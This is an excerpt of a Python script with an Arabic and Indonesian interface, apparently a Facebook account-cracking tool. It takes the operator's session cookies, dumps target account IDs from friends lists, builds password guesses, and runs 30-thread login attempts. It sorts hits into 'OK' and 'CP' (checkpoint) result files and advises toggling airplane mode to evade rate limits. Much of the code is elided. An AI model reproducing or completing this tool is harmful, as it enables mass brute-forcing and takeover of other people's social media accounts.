...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t BAKER => @R_K_EE '))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{h}] قم بوضع الكوكيز :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} الكوكيز صح{x} ');time.sleep(0)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s الكوكيز خطا !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	print(f' الايدي الخاص بك : '+str(my_id))
	print(f' الايبي الخاص بك  : {ip}')
	print(f' تلكرامي   : {gh}')
	print(' 1❤️‍🔥 Crack Publik : من الاصدقاء ')
	print(' 2❤️‍🔥 Check Crack : فحص الصيد ')
	print(' 0❤️‍🔥 login out : تسجيل خروج      ')
	_____alvino__adijaya_____ = input('\n اختر احد الخيارات الصحيحه : ')
	if _____alvino__adijaya_____ in ['1']:
		...
		print(' تم تسجيل الخروج + حذف ملفات تعريف الارتباط  ')
		exit()
	else:
		print(' اختر الصح ')
		back()
def error():
	print(f'{k}عذرا ، هذه الميزة لا تزال قيد الإصلاح {x}')
	time.sleep(1)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	...
	if kz in ['2']:
		...
		if len(vin)==0:
			...
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{Z} {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{Z}[{F} انقر فوق إدخال{Z} ]')
			back()
	elif kz in ['3']:
		back()
	else:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('Target Id ? عدد الايديات : '))
	except ValueError:
	...
	try:
		...
		print(f'{B}')
		print('إشارة لوه ليست جيدة النت ضعيف ')
		back()
	except (KeyError,IOError):
		print(f'{F} صداقة غير مسجلة {Z}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}1 Id old :  ايديات قديمه ')
	print('2 Id New :  ايديات جديده ')
	print('3 Id random :  ايديات عشوائي')
	print('')
	hu = input('اختر : ')
	if hu in ['1','01']:
	...
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input(' : باسورد يدوي (T عشوائي)( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] أدخل كلمة مرور إضافية كحد أدنى 6 او اضغط تخطي Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('أدخل كلمة مرور إضافية: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	...
	print(f' {h}تم حفظ النتائج بشكل جيد{x} : {h}OK/%s {x}'%(okc))
	print(f'تم حفظ نتائج CP بتنسيق : {k}CP/%s {x}'%(cpc))
	print(f'قم بإيقاف تشغيل وضع الطائرة في كل مرة {m}1k{x} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] لا تنس أن تكون ممتنًا ، ولا تنس أن تكون ممتنًا مبرمج @R_K_EE [cyan] ✓[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}{k} شكرا لك على تحربه اداتي {x} ')
		time.sleep(1)
		exit()
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [BAKER] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='baker'))
